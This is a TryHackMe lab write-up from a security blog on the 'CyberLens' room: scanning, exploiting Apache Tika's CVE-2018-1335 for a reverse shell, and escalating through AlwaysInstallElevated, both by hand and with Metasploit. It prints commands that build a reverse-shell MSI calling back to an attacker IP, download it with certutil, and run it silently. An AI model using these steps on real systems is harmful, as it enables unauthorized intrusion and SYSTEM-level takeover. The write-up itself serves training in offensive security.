<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: CyberLens</title>
<meta name=description content="CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/posts/thm-cyberlens/"><meta property="og:type" content="website"><meta property="og:title" content="THM: CyberLens"><meta property="og:description" content="CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated …"><meta property="og:image" content="https://scorpiosec.com/images/THM-CyberLens/CyberLens.svg"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-CyberLens/CyberLens.svg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: CyberLens"><meta name=twitter:description content="CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/thm-cyberlens/"><meta property="twitter:url" content="https://scorpiosec.com/posts/thm-cyberlens/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-CyberLens/CyberLens.svg"><link rel=canonical href=https://scorpiosec.com/posts/thm-cyberlens/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/thm-cyberlens/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: CyberLens</h1><small role=doc-subtitle></small><p class=post-date>5 min read |
<span class=post-date>June 19, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><p>CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated version of the software vulnerable to <code>CVE-2018-1335</code> is running. We get our initial foothold by exploiting the vulnerability. For privilege escalation we abuse <code>AlwaysInstallElevated</code> to obtain a system shell.</p><h2 id=scanning>Scanning</h2><p>We will use a Bash script to automate the scanning process. You can find it <a href=https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh>here</a>.</p><p>The script will:</p><ul><li>Scan a target IP for open ports</li><li>Extract them</li><li>Run a detailed scan on the open ports found and save the output in three different formats (.gnmap, .nmap, and .xml)</li></ul><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 80,135,139,445,3389,5985,47001,49664,49665,49667,49668,49669,49670,49677,61777
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-06-19 15:27 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.212.189
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.23s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
</span></span><span style=display:flex><span>80/tcp    open  http          Apache httpd 2.4.57 <span style=color:#56b6c2>((</span>Win64<span style=color:#56b6c2>))</span>
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-title: CyberLens: Unveiling the Hidden Matrix
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.57 <span style=color:#56b6c2>(</span>Win64<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
</span></span><span style=display:flex><span>3389/tcp  open  ms-wbt-server Microsoft Terminal Services
</span></span><span style=display:flex><span>|_ssl-date: 2024-06-19T20:27:52+00:00; -20s from scanner time.
</span></span><span style=display:flex><span>| rdp-ntlm-info: 
</span></span><span style=display:flex><span>|   Target_Name: CYBERLENS
</span></span><span style=display:flex><span>|   NetBIOS_Domain_Name: CYBERLENS
</span></span><span style=display:flex><span>|   NetBIOS_Computer_Name: CYBERLENS
</span></span><span style=display:flex><span>|   DNS_Domain_Name: CyberLens
</span></span><span style=display:flex><span>|   DNS_Computer_Name: CyberLens
</span></span><span style=display:flex><span>|   Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_  System_Time: 2024-06-19T20:27:42+00:00
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>CyberLens
</span></span><span style=display:flex><span>| Not valid before: 2024-06-18T19:35:16
</span></span><span style=display:flex><span>|_Not valid after:  2024-12-18T19:35:16
</span></span><span style=display:flex><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49668/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49670/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49677/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
</span></span><span style=display:flex><span>|_http-title: Welcome to the Apache Tika 1.17 Server
</span></span><span style=display:flex><span>|_http-cors: HEAD GET
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: PUT
</span></span><span style=display:flex><span>|_http-server-header: Jetty<span style=color:#56b6c2>(</span>8.y.z-SNAPSHOT<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-06-19T20:27:43
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>|_clock-skew: mean: -20s, deviation: 0s, median: -21s
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 70.15 seconds
</span></span></code></pre></div><h2 id=enumeration>Enumeration</h2><p>Visiting the target IP address we find a website with an upload feature.</p><p><img src=/images/THM-CyberLens/cyberlens-website.png alt="CyberLens website"></p><p>After capturing the request we get when we click on <code>Get Metadata</code> we see that the web server is making a request to port <code>61777</code>.</p><p><img src=/images/THM-CyberLens/port-for-request.png alt="Request to port 61777"></p><p>Checking the port, we get to a web page featuring Apache Tika 1.17.</p><blockquote><p>&ldquo;The Apache Tika toolkit detects and extracts metadata and text from over a thousand different file types (such as PPT, XLS, and PDF).&rdquo; Source - <a href=https://github.com/apache/tika>https://github.com/apache/tika</a></p></blockquote><p><img src=/images/THM-CyberLens/Apache-Tika.png alt="Apache Tika Server"></p><p><strong>We are able to solve this room entirely via Metasploit, this writeup will showcase the manual way and the Metasploit method.</strong></p><h2 id=manual-exploitation>Manual Exploitation</h2><h3 id=user-flag>User flag</h3><p>Researching &ldquo;Apache Tika 1.17 rce&rdquo; leads us to <a href=https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/>this</a> Rhino Security Labs article featuring CVE-2018-1335. A PoC is also available <a href=https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2018-1335/CVE-2018-1335.py>here</a>. To use it we have to follow this example:</p><pre tabindex=0><code>python3 CVE-2018-1335.py &lt;host&gt; &lt;port&gt; &lt;command&gt;
</code></pre><p>Since we are targeting a Windows machine we can make use of PowerShell to get a reverse shell.</p><blockquote><p>On <a href=https://www.revshells.com/>revshells.com</a>, we use a PowerShell #3 (base64) reverse shell</p></blockquote><pre tabindex=0><code>python3 CVE-2018-1335.py &lt;Target_IP&gt; &lt;PORT_NUMBER&gt; &lt;INSERT REVSHELL HERE&gt;
</code></pre><p>After running the exploit we get a connection on our listener, we have a shell as the user <code>cyberlens</code>.</p><p><img src=/images/THM-CyberLens/initial-foothold.png alt="Apache Tika Server"></p><p>We find the user flag on the user&rsquo;s Desktop.</p><p><img src=/images/THM-CyberLens/user-flag.png alt="user.txt location"></p><h3 id=privilege-escalation>Privilege Escalation</h3><p>For the system enumeration we use <a href=https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS>WinPEAS</a> and find that <code>AlwaysInstallElevated</code> is enabled.</p><p><img src=/images/THM-CyberLens/AlwaysInstallElevated.png alt="Winpeas finds AlwaysInstallElevated is enabled"></p><p>The <code>AlwaysInstallElevated</code> setting in Windows is a Group Policy setting that, when enabled, allows Windows Installer to install programs with elevated privileges (i.e., administrative rights) regardless of the user&rsquo;s current privilege level. This setting is controlled through two registry keys:</p><ol><li><strong>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</strong></li><li><strong>HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</strong></li></ol><p>If both of these registry keys are set to <code>1</code>, it means that any user, including those with only standard user privileges, can install MSI packages with elevated (administrator) privileges. <em>You can read more about it <a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated>here</a>.</em></p><p><a href=https://juggernaut-sec.com/alwaysinstallelevated/#Abusing_AlwaysInstallElevated_to_Obtain_a_SYSTEM_Shell>This</a> article explains how to abuse <code>AlwaysInstallElevated</code> to obtain a SYSTEM Shell.</p><ol><li>We craft a malicious msi file</li></ol><pre tabindex=0><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.104.130 LPORT=1234 -a x64 --platform Windows -f msi -o evil.msi
</code></pre><p><img src=/images/THM-CyberLens/malicious-msi.png alt="Malicious msi ile created with msfvenom"></p><ol start=2><li>Send it to the target</li></ol><pre tabindex=0><code>certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT_NUMBER/evil.msi evil.msi
</code></pre><ol start=3><li>Execute the msi file</li></ol><pre tabindex=0><code>msiexec /quiet /qn /i evil.msi
</code></pre><ol start=4><li>We get a connection on our listener as <code>nt authority\system</code></li></ol><p><img src=/images/THM-CyberLens/system-shell.png alt="System shell"></p><p>We can read the root flag (admin.txt) on the <code>Administrator</code> Desktop.</p><p><img src=/images/THM-CyberLens/root-flag-manual.png alt="System shell"></p><hr><h2 id=metasploit-method>Metasploit Method</h2><h3 id=user-flag-1>User flag</h3><p>We know which software we are targeting, so we check Metasploit for exploits.</p><p>We do find an exploit for <code>Header Command Injection</code>.</p><p><img src=/images/THM-CyberLens/apache-tika-exploit.png alt="Metasploit fins exploit for Apache Tika"></p><blockquote><p>Make sure to set all the options correctly. The remote port should be <code>61777</code>.</p></blockquote><p>After running the exploit we get a meterpreter shell.</p><p><img src=/images/THM-CyberLens/meterpreter-shell.png alt="Meterpreter shell"></p><p>We find the user flag on the user Desktop.</p><h3 id=privilege-escalation-1>Privilege Escalation</h3><p>Now to elevate our privileges we can use the <code>exploit_suggester</code> in Metasploit to find some leads.</p><blockquote><p>You can background the current meterpreter shell with <code>background</code></p></blockquote><p><img src=/images/THM-CyberLens/metasploit-privesc.png alt="Metasploit exploit suggester for privilege escalation"></p><p>All we have to do is to provide a session number and run the module.</p><p><img src=/images/THM-CyberLens/exploit-suggester.png alt="Metasploit - Exploit suggester module use"></p><p>It finds five possible exploits for our target.</p><p><img src=/images/THM-CyberLens/exploits-list.png alt="Exploits list found by exploit suggester in Metasploit"></p><p>We start with the first one.</p><pre tabindex=0><code>use exploit/windows/local/always_install_elevated
</code></pre><p>We need to provide a session number, a local host and a local port.</p><p><img src=/images/THM-CyberLens/installed-elevated-exploit.png alt="AlwaysInstallElevated exploit in Metasploit"></p><p>After running the exploit we get an elevated meterpreter session as <code>NT AUTHORITY\SYSTEM</code>.</p><p><img src=/images/THM-CyberLens/admin-shell.png alt="Meterpreter system shell"></p><h2 id=closing-words>Closing Words</h2><p>Metasploit is a powerful framework allowing you to automate a lot of tasks. I am still learning how to optimally use it in order to make my life easier. I found two resources that will be helpful:</p><ul><li><a href=https://www.offsec.com/metasploit-unleashed/>Metasploit Unleashed</a> - A free course by Offensive Security teaching you how to thoroughly use the framework.</li><li><a href=https://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X>Metasploit: The Penetration Tester&rsquo;s Guide</a> - This book is old but it will deepen your understanding of the framework. If you end up liking it, know that the second edition is coming out in November 2024.</li></ul><p><strong>Note:</strong> OSCP seekers should learn <strong>NOT</strong> to rely too much on Metasploit because you are only allowed to use it once during the exam.</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-crafty/>&#8592;
Previous:
HTB: Crafty</a></p><p class=prev-post-date>June 12, 2024</p></div><div class=next-post><p><a href=/posts/htb-office/>Next:
HTB: Office
&#8594;</a></p><p class=next-post-date>June 19, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#manual-exploitation>Manual Exploitation</a><ul><li><a href=#user-flag>User flag</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li><li><a href=#metasploit-method>Metasploit Method</a><ul><li><a href=#user-flag-1>User flag</a></li><li><a href=#privilege-escalation-1>Privilege Escalation</a></li></ul></li><li><a href=#closing-words>Closing Words</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>